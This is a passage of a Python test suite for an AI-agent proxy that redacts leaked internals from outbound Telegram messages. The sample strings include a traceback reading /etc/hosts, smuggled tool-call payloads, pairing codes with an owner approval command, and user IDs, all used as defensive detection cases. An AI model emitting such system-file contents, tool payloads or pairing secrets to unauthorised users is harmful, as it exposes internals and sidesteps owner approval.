    @pytest.mark.asyncio
    async def test_collaborator_high_risk_leakage_text_is_normalized(self):
        """Collaborator outbound text with raw file/trace leakage markers should be blocked."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "Traceback: failed to read /etc/hosts after parsing BOOTSTRAP.md",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "/etc/hosts" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_high_risk_leakage_text_is_normalized(self):
        """Collaborator form payload with raw tool/file leakage markers should be blocked."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": '<function_calls>{"name":"web_fetch","arguments":{}}</function_calls>',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "function_calls" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_caption_tool_payload_is_normalized_json(self):
        """Caption-only payloads should not bypass collaborator leak normalization."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "caption": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["caption"].lower()
        assert "sessions_spawn" not in result["caption"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_caption_tool_payload_is_normalized(self):
        """Form caption field should be filtered the same as text/draft/message fields."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "caption": '<function_calls>{"name":"web_fetch","arguments":{}}</function_calls>',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("caption", "").lower()
        assert "function_calls" not in parsed.get("caption", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_empty_text_with_caption_payload_is_normalized_json(self):
        """Empty text field must not bypass filtering when caption contains tool payload."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "   ",
                "caption": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["caption"].lower()
        assert "sessions_spawn" not in result["caption"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_empty_text_with_caption_payload_is_normalized(self):
        """Form payload empty text should not shadow caption filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "",
                "caption": '{"name":"web_fetch","arguments":{"url":"https://weather.com"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("caption", "").lower()
        assert "web_fetch" not in parsed.get("caption", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_empty_text_with_message_payload_is_normalized_json(self):
        """Empty text field must not bypass filtering when message contains tool payload."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "",
                "message": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["message"].lower()
        assert "sessions_spawn" not in result["message"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_empty_text_with_message_payload_is_normalized(self):
        """Form payload empty text should not shadow message filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": " ",
                "message": '<function_calls>{"name":"web_fetch","arguments":{}}</function_calls>',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("message", "").lower()
        assert "function_calls" not in parsed.get("message", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_empty_text_with_content_payload_is_normalized_json(self):
        """Empty text field must not bypass filtering when content contains tool payload."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "",
                "content": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["content"].lower()
        assert "sessions_spawn" not in result["content"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_empty_text_with_content_payload_is_normalized(self):
        """Form payload empty text should not shadow content filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": " ",
                "content": '<function_calls>{"name":"web_fetch","arguments":{}}</function_calls>',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("content", "").lower()
        assert "function_calls" not in parsed.get("content", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_empty_text_with_draft_payload_is_normalized_json(self):
        """Empty text field must not bypass filtering when draft contains tool payload."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": " ",
                "draft": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["draft"].lower()
        assert "sessions_spawn" not in result["draft"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_form_empty_text_with_draft_payload_is_normalized(self):
        """Form payload empty text should not shadow draft filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "",
                "draft": '<function_calls>{"name":"web_fetch","arguments":{}}</function_calls>',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("draft", "").lower()
        assert "function_calls" not in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_egress_approval_banner_is_redacted_json(self):
        """Collaborators should not receive internal egress approval banners."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "🌐 Egress Request\nDomain: weather.com:443\nRisk: Yellow\nTool: web_fetch\nID: abc123",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "egress request" not in result["text"].lower()
        assert "owner-gated" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_egress_approval_banner_is_redacted_form(self):
        """Form payload approval banners must be redacted for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "🌐 Egress Request Domain: weather.com:443 Risk: Yellow Tool: web_fetch ID: abc123",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "egress request" not in parsed.get("text", "").lower()
        assert "owner-gated" in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_pairing_code_leakage_is_redacted_json(self):
        """Collaborators should never receive pairing codes or pairing approval commands."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": (
                    "OpenClaw: access not configured.\n\n"
                    "Pairing code: ABC12345\n"
                    "Ask owner to run: openclaw pairing approve telegram ABC12345"
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "pairing code" not in result["text"].lower()
        assert "openclaw pairing approve telegram" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_pairing_code_leakage_is_redacted_form(self):
        """Form payloads containing pairing secrets must be blocked for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "Pairing code: ZYXW9876. openclaw pairing approve telegram ZYXW9876",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "pairing code" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_access_not_configured_user_id_leakage_is_redacted_json(self):
        """Collaborators should not receive telegram user-id enrollment leakage text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": (
                    "OpenClaw: access not configured.\n"
                    "Your Telegram user id: 123456789\n"
                    "Ask owner to approve pairing."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "your telegram user id" not in result["text"].lower()
        assert "access not configured" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_access_not_configured_user_id_leakage_is_redacted_form(self):
        """Form payload user-id enrollment leakage should also be blocked."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "OpenClaw: access not configured. Your Telegram user id: 123456789",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "your telegram user id" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_sandbox_error_is_rewritten(self):
        """Healthcheck SKILL.md sandbox errors should be rewritten to local-healthcheck guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "I apologize, but I am unable to access the healthcheck skill's SKILL.md file "
                    "due to sandbox security restrictions."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "skill.md" not in result["text"].lower()
        assert "/healthcheck" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_sandbox_error_variant_is_rewritten(self):
        """Wording variants for healthcheck SKILL.md sandbox errors should be rewritten."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "I can't access healthcheck SKILL.md because of sandbox security restrictions."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "skill.md" not in result["text"].lower()
        assert "/healthcheck" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_sandbox_error_with_cannot_is_rewritten(self):
        """'Cannot access' phrasing should be rewritten for healthcheck SKILL.md sandbox messages."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "skill.md" not in result["text"].lower()
        assert "/healthcheck" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_is_rewritten_for_json_draft_field(self):
        """Runtime memory provider errors should rewrite when payload uses draft field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "draft": "Memory search unavailable: embedding provider error while refreshing index.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("draft", "")
        assert "embedding provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_is_rewritten_for_json_caption_field(self):
        """Healthcheck SKILL.md sandbox errors should rewrite when payload uses caption field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "caption": "I can't access healthcheck SKILL.md because of sandbox security restrictions.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("caption", "")
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_message_without_sandbox_is_not_rewritten_for_json_caption_field(
        self,
    ):
        """JSON caption field should keep healthcheck SKILL.md text unchanged when sandbox hint is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        body = json.dumps({"chat_id": "8096968754", "caption": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("caption", "") == original

    @pytest.mark.asyncio
    async def test_memory_provider_error_is_rewritten_for_json_message_field(self):
        """Memory provider runtime errors should rewrite when payload uses message field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "message": "Memory search unavailable: embedding/provider error while refreshing index.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("message", "")
        assert "embedding/provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_is_rewritten_for_json_message_field(self):
        """Healthcheck SKILL.md sandbox errors should rewrite when payload uses message field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "message": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("message", "")
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_is_rewritten_for_json_content_field(self):
        """Healthcheck sandbox SKILL.md errors should rewrite when payload uses content field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "content": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("content", "")
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_message_without_sandbox_is_not_rewritten_for_json_content_field(
        self,
    ):
        """JSON content field should keep healthcheck SKILL.md text unchanged when sandbox hint is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        body = json.dumps({"chat_id": "8096968754", "content": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("content", "") == original

    @pytest.mark.asyncio
    async def test_memory_provider_error_is_rewritten_for_form_payload(self):
        """Embedding/provider memory errors should also be rewritten for urlencoded payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": (
                    "Memory search is currently unavailable due to an embedding/provider error. "
                    "Please check the embedding provider configuration and retry."
                ),
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "embedding/provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_variant_is_rewritten_for_form_payload(self):
        """Embedding provider wording variants should rewrite for urlencoded payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "MEMORY SEARCH DISABLED: EMBEDDING_PROVIDER ERROR DURING INDEX BOOT",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "embedding_provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_slash_variant_is_rewritten_for_form_payload(self):
        """Slash-separated embedding/provider wording should rewrite for form payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "Memory search unavailable: embedding/provider error from index bootstrap.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "embedding/provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_hyphen_variant_is_rewritten_for_form_payload(self):
        """Hyphen-separated embedding-provider wording should rewrite for form payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "Memory search disabled: embedding-provider error during index bootstrap.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "embedding-provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_error_without_embedding_provider_hint_is_not_rewritten(self):
        """Non-embedding memory errors should not be forced into embedding guidance text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Memory search unavailable: disk read error while opening index."
        body = json.dumps({"chat_id": "8096968754", "text": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result["text"] == original

    @pytest.mark.asyncio
    async def test_memory_error_without_error_keyword_is_not_rewritten(self):
        """Embedding/provider hints without explicit error marker should not trigger rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = (
            "Memory search unavailable: embedding/provider unavailable during index bootstrap."
        )
        body = json.dumps({"chat_id": "8096968754", "text": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result["text"] == original

    @pytest.mark.asyncio
    async def test_memory_error_without_error_keyword_is_not_rewritten_for_json_message_field(self):
        """JSON message field with embedding/provider hints but no error keyword should remain unchanged."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = (
            "Memory search unavailable: embedding-provider unavailable during index bootstrap."
        )
        body = json.dumps({"chat_id": "8096968754", "message": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("message", "") == original

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_without_sandbox_hint_is_not_rewritten(self):
        """Healthcheck SKILL messages without sandbox context should not trigger sandbox rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        body = json.dumps({"chat_id": "8096968754", "text": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result["text"] == original

    @pytest.mark.asyncio
    async def test_skill_sandbox_message_without_healthcheck_is_not_rewritten(self):
        """Sandbox SKILL.md messages must include healthcheck context before rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access profile skill.md due to sandbox restrictions."
        body = json.dumps({"chat_id": "8096968754", "text": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result["text"] == original

    @pytest.mark.asyncio
    async def test_healthcheck_sandbox_message_without_skill_md_is_not_rewritten(self):
        """Healthcheck sandbox messages without SKILL.md marker should not trigger rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck diagnostics due to sandbox restrictions."
        body = json.dumps({"chat_id": "8096968754", "text": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result["text"] == original

    @pytest.mark.asyncio
    async def test_skill_sandbox_message_without_healthcheck_is_not_rewritten_for_message_field(
        self,
    ):
        """JSON message field should keep non-healthcheck SKILL.md sandbox text unchanged."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access profile skill.md due to sandbox restrictions."
        body = json.dumps({"chat_id": "8096968754", "message": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("message", "") == original

    @pytest.mark.asyncio
    async def test_healthcheck_skill_message_without_sandbox_is_not_rewritten_for_message_field(
        self,
    ):
        """JSON message field should keep healthcheck SKILL.md text unchanged when sandbox hint is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        body = json.dumps({"chat_id": "8096968754", "message": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("message", "") == original

    @pytest.mark.asyncio
    async def test_healthcheck_sandbox_message_without_skill_md_is_not_rewritten_for_content_field(
        self,
    ):
        """JSON content field should keep healthcheck sandbox text unchanged when SKILL.md marker is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck diagnostics due to sandbox restrictions."
        body = json.dumps({"chat_id": "8096968754", "content": original}).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("content", "") == original

    @pytest.mark.asyncio
    async def test_memory_error_without_embedding_provider_hint_is_not_rewritten_for_form_payload(
        self,
    ):
        """Form payload non-embedding memory errors should keep original text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Memory search unavailable: disk read error while opening index."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "text": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("text", [""])[0] == original

    @pytest.mark.asyncio
    async def test_memory_error_without_error_keyword_is_not_rewritten_for_form_payload(self):
        """Form payload embedding/provider hints without 'error' should keep original text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = (
            "Memory search unavailable: embedding-provider unavailable during index bootstrap."
        )
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "text": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("text", [""])[0] == original

    @pytest.mark.asyncio
    async def test_memory_error_without_error_keyword_is_not_rewritten_for_form_message_field(self):
        """Form message field with embedding/provider hints but no error keyword should remain unchanged."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = (
            "Memory search unavailable: embedding/provider unavailable during index bootstrap."
        )
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "message": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("message", [""])[0] == original

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_without_sandbox_hint_is_not_rewritten_for_form_payload(
        self,
    ):
        """Form payload healthcheck SKILL text without sandbox context should keep original text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "text": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("text", [""])[0] == original

    @pytest.mark.asyncio
    async def test_skill_sandbox_message_without_healthcheck_is_not_rewritten_for_form_caption(
        self,
    ):
        """Form caption should keep non-healthcheck SKILL.md sandbox text unchanged."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access profile skill.md due to sandbox restrictions."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "caption": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("caption", [""])[0] == original

    @pytest.mark.asyncio
    async def test_skill_sandbox_message_without_healthcheck_is_not_rewritten_for_form_message(
        self,
    ):
        """Form message should keep non-healthcheck SKILL.md sandbox text unchanged."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access profile skill.md due to sandbox restrictions."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "message": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("message", [""])[0] == original

    @pytest.mark.asyncio
    async def test_healthcheck_skill_message_without_sandbox_is_not_rewritten_for_form_message(
        self,
    ):
        """Form message should keep healthcheck SKILL.md text unchanged when sandbox hint is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck skill.md from this environment."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "message": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("message", [""])[0] == original

    @pytest.mark.asyncio
    async def test_healthcheck_sandbox_message_without_skill_md_is_not_rewritten_for_form_content(
        self,
    ):
        """Form content should keep healthcheck sandbox text unchanged when SKILL.md marker is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck diagnostics due to sandbox restrictions."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "content": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("content", [""])[0] == original

    @pytest.mark.asyncio
    async def test_healthcheck_sandbox_message_without_skill_md_is_not_rewritten_for_form_draft(
        self,
    ):
        """Form draft should keep healthcheck sandbox text unchanged when SKILL.md marker is absent."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        original = "Cannot access healthcheck diagnostics due to sandbox restrictions."
        form_body = urllib.parse.urlencode({"chat_id": "8096968754", "draft": original}).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        assert result.get("draft", [""])[0] == original

    @pytest.mark.asyncio
    async def test_healthcheck_skill_sandbox_error_is_rewritten_for_form_payload(self):
        """Healthcheck SKILL.md sandbox errors should be rewritten for urlencoded payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": (
                    "I apologize, but I am unable to access the healthcheck skill's SKILL.md file "
                    "due to sandbox security restrictions."
                ),
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_sandbox_cannot_variant_is_rewritten_for_form_payload(self):
        """'Cannot access' healthcheck SKILL.md sandbox wording should rewrite for form payloads."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_is_rewritten_for_form_caption_field(self):
        """Memory provider runtime errors should rewrite when form payload uses caption field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "caption": "Memory search unavailable: embedding/provider error while refreshing index.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("caption", [""])[0]
        assert "embedding/provider error" not in text.lower()
        assert "runtime dependency error" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_is_rewritten_for_form_content_field(self):
        """Healthcheck sandbox SKILL.md errors should rewrite when form payload uses content field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "content": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("content", [""])[0]
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_healthcheck_skill_error_is_rewritten_for_form_message_field(self):
        """Healthcheck SKILL.md sandbox errors should rewrite when form payload uses message field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "message": "Cannot access healthcheck skill.md due to sandbox restrictions.",
            }
